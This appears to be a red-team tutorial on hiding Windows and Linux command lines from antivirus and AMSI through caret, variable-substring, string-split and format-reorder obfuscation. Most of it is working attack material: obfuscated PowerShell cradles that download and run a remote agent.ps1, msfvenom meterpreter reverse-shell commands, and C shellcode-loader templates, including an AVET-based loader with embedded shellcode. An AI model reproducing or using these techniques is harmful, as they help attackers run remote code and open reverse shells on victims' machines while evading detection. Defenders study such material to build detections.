![banner](http://i.cubeupload.com/1Kopfs.jpg)

      This article contains a list of simple obfuscation technics that can be used into obfuscating system
      call's like (powershell.exe -EncodedCommand OR cmd.exe /c start /MIN) in one attempt to bypass AV's
      AMSI and DEP detection mechanisms, why? let assume we have crypted our shellcode with one AES master
      key, and the AV vendor can't read inside the crypted shellcode to determine if there actions are good
      or bad, in this ocasion the AV vendor also looks for system call's that may reveal malicious actions.

![detection pic](http://i.cubeupload.com/pLllwr.jpg)

<br />

      SPECIAL NOTE:
        remember that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
        interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
        console, then the powershell interpreter will not be able to escape the special character.

**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)

**Good character sellection** [ powershell special character used in powershell interpreter ]
![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)

---

<br /><br /><br /><br /><br />

## Batch Obfuscation

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch special character: ^** <br />

- String obfuscated<br />

      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode

![batch obfuscation](http://i.cubeupload.com/IBknFW.jpg)

---

- Any formula under the **batch interpreter** can be start with the follow special characters: **@** or **=** or **,** or **;**

      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![batch obfuscation](http://i.cubeupload.com/nVD7On.jpg)

---

- We can also **pipe** commands to avoid detection

      echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![pipe commands](http://i.cubeupload.com/Ulus3M.jpg)

---

      Using a batch redirection caret (<nul) to 'escape' tokens.
      'If you place a token at the caret the token is replaced by a empty string'.

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

- String obfuscated (**<nul**) special character.<br />
`cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`

![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)

---

      Obfuscating windows batch files using undefined environmental variables.
      Inside .bat files undefined environmental variables are expanded to empty
      strings. Since cmd.exe allows using variables inside commands.

      1º Choose some set of environmental variables that you are certain are not defined
         on most of the machines e.g. single or two letter variables like %A%, %B%, %C%

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**test.bat**)<br />

      @echo off
      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode

![batch obfuscation](http://i.cubeupload.com/nMLRrc.jpg)

---

      This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
      strings inside the %varoBj% variable to build our command. [special thanks to: @Wandoelmo Silva]

<br />

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- String obfuscated (**template.bat**)<br />

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
      exit

![batch obfuscation](http://i.cubeupload.com/5gkOX8.jpg)

- Description of %varObj% master_key:<br />
https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md

---

       use base64 to decode the encoded syscall :)

       [using pure batch and certutil]
       @echo off
       del /q /f "%temp%\b64"  >nul 2>nul
       del /q /f "%temp%\decoded"  >nul 2>nul

       set "base64string=YmFzZTY0c3RyaW5n"
       echo -----BEGIN CERTIFICATE----->"%temp%\b64"
       <nul set /p=%base64string% >>"%temp%\b64"
       echo -----END CERTIFICATE----->>"%temp%\b64"

       certutil /decode "%temp%\b64" "%temp%\decoded" >nul 2>nul


       for /f "useback tokens=* delims=" %%# in ("%temp%\decoded")  do set "decoded=%%#"
       echo %decoded% <-- here is our base64 syscall decoded

       del /q /f "%temp%\b64"  >nul 2>nul
       del /q /f "%temp%\decoded"  >nul 2>nul


       [using powershell]
       set "base64string=YmFzZTY0c3RyaW5n"
       for /f "tokens=* delims=" %%# in ('powershell[System.Text.Encoding]::UTF8.GetString([Syste.Convert]::FromBase64String("""%base64string%"""^^)') do set "decoded=%%#"
       echo %decoded% <-- here is our base64 syscall decoded

---

<br /><br /><br /><br />

## Bash Obfuscation

- String command to obfuscate<br />
`whoami`<br />
The above string can be obfuscated using **bash special characters: '** or **\\** or **$@**<br />

- String obfuscated<br />

      w'h'o'am'i <-- This technic requires to 'open' and 'close' the single quotes

      w\h\o\am\i

      w$@h$@o$@am$@i

      w$@h\o$@am\i <-- Using the 2 previous methods together 

![3 special characters](http://i.cubeupload.com/tLBdbW.png)

---

- We can also **pipe** commands to avoid detection with **|** or **;** or **&&**

      echo "Rubish data" | w$@h$@o\am$@i

      echo $@I A\M; who\am$@i

      echo $@I A\M; wh$@oam$@i && echo o\ff$@cou$@rs\e .\.

![pipe bash obfuscation](http://i.cubeupload.com/0oCn6M.png)

---

- Using **rev <<<** to reverse the order of characters in a string

      OBFUSCATED   : rev <<< 'm- klbsl' |$0
      DE-OBFUSCATED: lsblk -m

![bash rev obfuscation](http://i.cubeupload.com/lsyzo5.png)

      OBFUSCATED   : rev <<< i$@ma\o$@hw |$0
      DE-OBFUSCATED: whoami

![bash rev obfuscation](http://i.cubeupload.com/Q7qgFW.png)
`HINT: Single quotes are not allowed in Combining rev <<< and the batch (\) escape character`


---

      This next technic uses one bash local variable ($M) as MasterKey that allow us to extract
      strings inside the $M variable to build our command and sends it to a file named meme.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`route`<br />

- String obfuscated (**oneliner**)<br />

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} > meme; ul meme
      OUTPUT: print parsed data on screen (route syscall pulled from inside $M variable)

![bash obfuscation](http://i.cubeupload.com/NdTN6N.jpg)

      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} |$0
      OUTPUT: parsing data inside $M variable to extract and 'execute' the string: route

![bash obfuscation](http://i.cubeupload.com/eRmZtT.jpg)
`HINT: The var ${M:0:1} extracts the letter U from inside the $M local variable`

---

      This next technic uses $s bash local variable to extract the letters from the variable $skid then
      uses a loop funtion (for i in) to take the arrays and convert them into a string, them the pipe | tr -d
      command will delete the empty lines from the string and passes the output (pipe) to 'do echo ${skid[$i]}'
      funtion that prints the results (full string) on screen, the 'done' funtion will close the 'for i in' loop.
      [special thanks to: @Muhammad Samaak]

<br />

- String command to obfuscate<br />
`whoami`<br />

- String obfuscated (**oneliner**)<br />

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done
      OUTPUT: parsing data inside $skid and $s variables to extract the string: whoami

![bash obfuscation](http://i.cubeupload.com/HkX7JH.png)

      skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done |$0
      OUTPUT: parsing data inside $skid and $s variables to 'extract' and 'execute' the string: whoami

![bash obfuscation](http://i.cubeupload.com/gdgswy.png)

`HINT: The number 0 inside variable $s conrresponds to the letter possition in var $skid (i)`

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.sh dosen't contain any real malicious syscall's to be scan/flagged. 


- String command to obfuscate<br />
`route -n`

- Using **base64** to decode the bash local variable **$string** (syscall)

      1º - encode the command you want to obfuscate
      echo "route -n" | base64

      2º - copy the encoded string to paste it on your script
      cm91dGUgLW4K

      3º - Insert the follow lines into your bash script
      string=`echo "cm91dGUgLW4K" | base64 -d`
      $string   <-- execute/decode the base64 string (syscall) at runtime

![bash obfuscation](http://i.cubeupload.com/gXKy3s.png)

---

<br /><br /><br /><br />

## Powershell Obfuscation

- String command to obfuscate<br />
`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell special character: `**<br />

- String obfuscated<br />

      po`wer`shel`l.ex`e -n`op -w`in`d h`idd`en -E`xe`c B`yp`ass -n`on`i -en`c $shellcode

![powershell obfuscation](http://i.cubeupload.com/7hUkvC.jpg)

---

- Using one **batch** local variable inside the **powershell interpreter**

      cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe

![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)

- More Obfuscated using powershell **`** and batch **^** special characters

      c`md`.e`xe /c "s^Et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shell.`ex`e

![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)

---

- String command to obfuscate<br />
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />

- String obfuscated<br />

      $get="N`et.Web`Cli`ent"              <-- caret ` inside double quotes
      $Dow='Do'+'wn'+'loa'+'dStri'+'ng'    <-- caret + inside single quotes
      powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')

![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)

---

- Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º ,15º and 25º characters<br />
from $env:comspec variable and use the **-Join ''** operator to take the array and convert it to a string.

      $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')

![powershell obfuscation](http://i.cubeupload.com/CIbrFI.jpg)

---

- Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join ''** it back again

      $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX

![powershell obfuscation](http://i.cubeupload.com/wAZr7K.jpg)

---

      RTLO --

![powershell obfuscation](http://i.cubeupload.com/yukEB8.jpg)

---

      Using -f (reorder) switch to re-order the strings in there correct order, the switch
      -f accepts strings separated by a comma, and the caret {} contains the string position
      after the -f switch.. HINT: {0} == {vice} | {3} == {et-} | {1} == {Ser} | {2} == {G}
      [Special thanks to: @danielbohannon]

- Using **splatting + reorder** (-f) obfuscation technic

      OBFUSCATED    : ("{0}{2}{1}{3}" -f'vice','Ser','G','et-')
      DE-OBFUSCATED : Get-Service

![powershell obfuscation](http://i.cubeupload.com/1hy2GA.jpg)

- **Stacking** commands together with the **&** caret

      OBFUSCATED    :("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))
      DE-OBFUSCATED : Invoke-Expression (New-Object)

---

- Another way to use **splatting + reorder** technic to remote download/execute agent

      I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Downnload','http://','lie') | I`EX

![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)

---

<br /><br /><br /><br />

## C to ANCII Obfuscation

- Encoding shellcode from **C** to **ANCII**

      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode

      8b5a00270d0a              <-- ANCII shellcode

---

- Build shellcode in **C** format using msfvenom and escaping **bad chars** (-b '\x0a\x0d')

      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt

- **Parsing** shellcode data (from C to ANCII)

      # store parsed data into '$store' bash local variable
      store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`

- **template.c** to be injected with generated shellcode

      #include
      #include
      #include
      #include
      #include
      #include
      #include

      <stdio.h>
      <stdlib.h>
      <unistd.h>
      <string.h>
      <windows.h>
      <tchar.h>
      <stdlib.h>

      void exec_mycode(unsigned char *mycode)
      {
      int (*funct)();
         funct = (int (*)()) mycode;
         (int)(*funct)();
      }

      // return pointer to mycode
      unsigned char* decode_mycode(unsigned char *buffer, unsigned char *mycode, int size)
      {
      int j=0;
         mycode=malloc((size/2));
         int i=0;
      do
      {
      unsigned char temp[3]={0};
         sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
         mycode[j] = strtoul(temp, NULL, 16);
         i+=2;
         j++;
      } while(i<size);
         return mycode;
      }
         int main (int argc, char **argv)
      {
         unsigned char *mycode;

      unsigned char buffer[]=
      "INSERT_SHELLCODE_HERE";

      int size = sizeof(buffer);
         mycode = decode_mycode(buffer,mycode,size);
         exec_mycode(mycode);
      }


<br />

- **Inject** parsed shellcode into **template.c**

      # inject shellcode into template.c using SED bash command
      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c


- Compile template.c with **GCC** software to **.exe**

      gcc.exe template.c -o agent.exe

---


<br /><br /><br /><br />

## Bypass the scan engine (daniel sauder: avet)

      This next technic writes a file to disk before executing shellcode into target ram ..
      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.

---

![avet bypass](http://i.cubeupload.com/ub18vo.png)

---

<br />

**template.c** from AVET<br />


      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <windows.h>
      #include <tchar.h>
      #include <stdlib.h>
      #include <strsafe.h>

      void exec_mycode(unsigned char *mycode)
      {
        int (*funct)();
        funct = (int (*)()) mycode;
        (int)(*funct)();
      }


      int main (int argc, char **argv)
      {
      /*
      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
      */

      unsigned char buffer[]= 
      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
	
      /*
      Here is the bypass. A file is written, this bypasses the scan engine
      */
        HANDLE hFile;
	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
		exit(0);

	exec_mycode(buffer);
      }

---

<br /><br /><br /><br />

---

                                      - FINAL NOTES -

      95% of the obfuscation technics in the 'powershell' section contained in this article are
      based in the exelent 'Invoke-Obfuscation' powershell cmdlet develop by: @danielbohannon.

      Also keep in mind of the most common obfuscations technics like write a file on disk before
      executing any malicious actions (agent execution) replace any main functions (syscall's)
      by base64 encoded strings, and store them inside your script (agent) as local variables
      to be called at runtime execution also remmenber to use 'Rubish Data' piped (|) before your
      system call and the last but not least, Concatenate also all function names to use big and
      small letters (eg PoWeRshElL.exE) since cmd.exe interpreter its not case sensitive.

      Its never to late to remmenber that diferent technics can be combined together to achieve
      better results. The next example shows one powershell payload embbebed into one template.bat
      using 5 diferent batch obfuscation technics found in this article:

<br />

      OBFUSCATED    : @c^Md%i:~63,1%e^xE %i:~62,1%c pO^w%U7%he^L^l%i:~63,1%e^xE %H%%E0%p -%i:~25,1%%i:~44,1%n^D %i:~7,1%id^D%k8% %H%ex^EC %i:~1,1%%i:~24,1%P^a%i:~53,1%s %H%n^o%w2% -%k8%c $ENCODED-SHELLCODE-STRING
      DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING

---

### Special thanks to:
**@danielbohannon** **@Andy Green** **@404death**<br />
**@daniel sauder(avet)** **@Wandoelmo Silva** and<br />
**@Muhammad Samaak <-- for is contributions to this project ^_^**

<br />

### Referencies
[1] https://twitter.com/404death<br />
[2] https://github.com/govolution/avepoc<br />
[3] https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
[4] https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
[5] http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9<br />
[6] https://malwaretips.com/threads/how-to-de-obfuscate-powershell-script-commands-examples.76369/<br />
[7] http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier<br />

<br />

## Author: r00t-3xp10it
# Suspicious Shell Activity (red team) @2018
